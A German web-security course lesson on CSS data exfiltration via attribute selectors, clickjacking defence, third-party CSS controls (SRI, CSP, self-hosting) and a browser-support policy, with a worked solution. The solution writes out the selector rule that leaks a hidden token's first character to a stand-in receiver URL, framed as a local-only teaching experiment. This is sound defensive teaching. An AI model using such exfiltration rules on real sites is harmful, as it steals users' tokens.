# 21.5 CSS-Sicherheit, Third-Party CSS und Browser-Kompatibilität

> Modul 21 · Lehrplan 21.6 · Geschätzter Zeitaufwand: 105 Minuten

## Lernziele

- Du erklärst, wie CSS Daten abfließen lassen kann, und belegst die Wirkung der Gegenmaßnahme in einem Experiment.
- Du erklärst Clickjacking und prüfst den Schutz im Antwort-Header.
- Du bewertest Drittanbieter-CSS nach Risiko und setzt Gegenmaßnahmen ein (selbst hosten, Version, SRI, Ebene, CSP).
- Du legst eine Browser-Support-Policy fest und prüfst CSS gegen sie, einschließlich der Grenzen des Werkzeugs.

## Voraussetzungen

Modul 18 (Security, CSP); Modul 19/20 (Tooling); Node.js 22; ein Playwright-Browser für das Experiment

## Ausgangslage

Im Experiment [`css-exfiltration.html`](../portfolio/modul-21/experimente/css-exfiltration.html) fragt ein Stylesheet über Attributselektoren ab, wie der Wert eines Feldes beginnt, und meldet jeden Treffer per Hintergrundbild an einen Empfänger ([`leak-empfaenger.js`](../portfolio/modul-21/experimente/leak-empfaenger.js)). Das Token im Feld ist ausgedacht. **Nur lokal ausführen, nie gegen fremde Seiten.** Außerdem: [Inventar externer Ressourcen](../portfolio/modul-21/docs/drittanbieter-inventar.md), [Browser-Support-Policy](../portfolio/modul-21/docs/browser-support-policy.md).

## Aufgabe

1. Starte den Empfänger (`node experimente/leak-empfaenger.js 8140`) und den Testserver (`node tools/server.js 8141 .`). Öffne `http://localhost:8141/experimente/css-exfiltration.html` und beobachte den Empfänger. Wiederhole mit dem Zusatz `?csp=enforce`. Erkläre den Unterschied.
2. Erkläre den Angriff: Was sieht der Empfänger, was nicht? Warum funktioniert er nicht mit dem, was ein Nutzer **eintippt**?
3. **Clickjacking:** Wie funktioniert er, und welcher Header schützt? Prüfe die Antwort des Testservers (`curl -I http://localhost:8141/`). Warum reicht eine `<meta>`-CSP dafür nicht?
4. **Lehrplan-Aufgabe 5:** Wie reduzierst du das Risiko bei Drittanbieter-CSS? Prüfe mit `node tools/drittanbieter-check.js docs/drittanbieter/beispiel-extern.html docs/drittanbieter/beispiel-extern.css` und danach `npm run drittanbieter` auf der eigenen Seite.
5. Lege eine Browser-Support-Policy fest und prüfe das CSS: `npm run css:browser`. Bewerte jede Warnung. Ändere dann die Browserliste auf `> 0.5%, last 2 versions, not dead` und beschreibe, was passiert.

## Hinweise

- Der Empfänger kennt nur die Anfragen, die bei ihm ankommen. Frage dich, was ein Angreifer daraus ableiten kann, wenn er viele Anfragen kombiniert.
- Nach dem Experiment: Browser-Konsole öffnen; die Meldung zur Content Security Policy benennt die verletzte Regel.
- Eine Warnung eines Prüfwerkzeugs ist ein Anlass zur Prüfung, kein Urteil.

## Lösung

1. Gemessen mit Chromium (Playwright): **Ohne CSP** erreicht den Empfänger genau eine Anfrage `GET /leak?anfang=q`: Das Feld beginnt mit „q“ (Platzhalter `q7x2`). **Mit `?csp=enforce`** (`img-src 'self'`) kommt keine Anfrage an; die Konsole meldet „Loading the image 'http://localhost:8140/leak?anfang=q' violates the following Content Security Policy directive …“. Das Stylesheet ist erlaubt (`style-src 'self'`), nur der Weg nach außen ist zu.
2. Das fremde Stylesheet kennt den Wert nicht. Es enthält für jedes mögliche erste Zeichen (a–z, 0–9) eine Regel `input[name='token'][value^='X'] { background-image: url(http://empfaenger/leak?anfang=X) }`. Der Browser lädt nur das Bild der **passenden** Regel, und der Empfänger erfährt so das erste Zeichen. Mit weiteren Regeln für zwei, drei … Zeichen ließe sich der Wert Stück für Stück erraten (das Experiment zeigt nur das erste Zeichen). Wichtig: Attributselektoren sehen nur das **Attribut** im HTML (`value="…"`), nicht den vom Nutzer getippten Text. Gefährdet sind also Werte, die im Markup stehen (versteckte Felder mit Token, `data-`-Attribute, Links mit Kennungen), vor allem wenn **fremdes CSS** geladen wird oder Nutzer eigenes CSS einschleusen können. Schutz: kein fremdes CSS, strenge CSP (`img-src`, `style-src`, `font-src`, `default-src`), sensible Werte nicht in Attribute schreiben.
3. Clickjacking: Eine fremde Seite bettet deine Seite unsichtbar in einen `iframe` und legt darüber eigene Bedienelemente; der Nutzer klickt unbemerkt auf deine Seite. Schutz: die CSP-Direktive **`frame-ancestors 'none'`** (oder `'self'`) im **HTTP-Header** (alternativ der ältere `X-Frame-Options`). Der Testserver sendet `frame-ancestors 'none'` im Header (gemessen am Header der Wartungsseite und der Seiten). Eine `<meta http-equiv>`-CSP kann `frame-ancestors` nach der CSP-Spezifikation **nicht** setzen; auf reinem statischem Hosting ohne Header-Kontrolle gibt es diesen Schutz also nicht (siehe Hosting-Entscheidung, Kriterium „Eigene Antwort-Header“). Ob ein Browser `:visited`-Informationen preisgibt: Browser schränken die Gestaltung besuchter Links stark ein; das steht so im Lehrplan, ich habe es **nicht** getestet.
4. Maßnahmen und Messwerte: **Brauche ich ihn?** → Eigener Code statt Bibliothek. **Selbst hosten** (keine Verbindung zu Fremdservern, Datenschutz). **Feste Version**, nie `latest`. **SRI** (`integrity="sha384-…" crossorigin="anonymous"`). **`@layer vendor`** (die Ebene steht in `00-layers.css` ganz vorn, eigene Regeln gewinnen). **CSP** auf genau diese Quelle öffnen. **Inventar** führen. Gemessen: Die Beispieldateien liefern **7 externe Ressourcen, 6 davon mit Befund** (u. a. `@latest` ohne SRI, `@import`, Bild und Schrift von fremdem Server). Die **eigene Seite**: 39 geprüfte Dateien (52 inklusive `dist`), **0 externe Ressourcen**. SRI wird nur auf Form geprüft (Präfix `sha384-` usw.), nicht auf den richtigen Hash; den prüft der Browser. **Nicht getestet:** das tatsächliche Laden mit SRI von einem CDN.
5. Policy: Stufe A = jeweils die 2 neuesten Versionen von Chrome, Edge, Firefox, Safari, iOS Safari; Stufe B = Autoprefixer-Abfrage aus `package.json`; Stufe C = nicht unterstützt (u. a. Internet Explorer). Ergebnis von `npm run css:browser` mit Stufe A: **5 Warnungen, 0 Fehler** — `::selection`, `clip-path`, `cursor: not-allowed`, `column-gap` und `break-inside` — alle harmlos oder ein Fehlalarm (`column-gap` wird dort in Flexbox/Grid genutzt, das Plug-in ordnet es der Mehrspaltigkeit zu); Einzelbewertung in der [Policy](../portfolio/modul-21/docs/browser-support-policy.md). Mit der **Autoprefixer-Abfrage** meldete dasselbe Plug-in **379 Warnungen**, vor allem wegen „Opera Mini all“: Das Werkzeug ist nur so brauchbar wie die Browserliste. Das Plug-in `stylelint-no-unsupported-browser-features` 8.1.2 lief mit Stylelint 18.0.0. Es bezieht seine Daten aus der Datenbank „Can I use“ und hat Lücken und Fehlalarme (siehe oben); es ersetzt keinen Test in echten Browsern.

   **Nicht getestet:** Firefox, Safari, echte Geräte; ein Angriff mit fremdem CSS über einen echten Fremdserver; `:visited`.
